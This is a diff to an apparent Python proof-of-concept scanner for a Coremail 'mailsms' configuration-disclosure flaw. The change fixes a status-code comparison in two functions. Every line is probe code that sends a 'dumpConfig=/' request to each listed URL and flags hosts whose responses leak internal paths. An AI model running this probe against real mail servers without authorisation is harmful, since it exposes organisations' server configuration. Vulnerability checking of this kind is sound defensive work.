@@ -14,7 +14,7 @@ def mailsmsPoC1(url_file):
 		url = each + "mailsms/s?func=ADMIN:appState&dumpConfig=/"
 		try:
 			r = requests.get(url,verify=False)
-			if (r.status_code != '404') and ("/home/coremail" in r.text):
+			if (r.status_code != 404) and ("/home/coremail" in r.text):
 				print each,"mailsms is vulnerable: {0}".format(url)
 			else:
 				print each,"safe!"
@@ -25,7 +25,7 @@ def mailsmsPoC2(url):
 	url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
 	try:
 		r = requests.get(url)
-		if (r.status_code != '404') and ("/home/coremail" in r.text):
+		if (r.status_code != 404) and ("/home/coremail" in r.text):
 			print url,"mailsms is vulnerable: {0}".format(url)
 		else:
 			print url,"safe!"
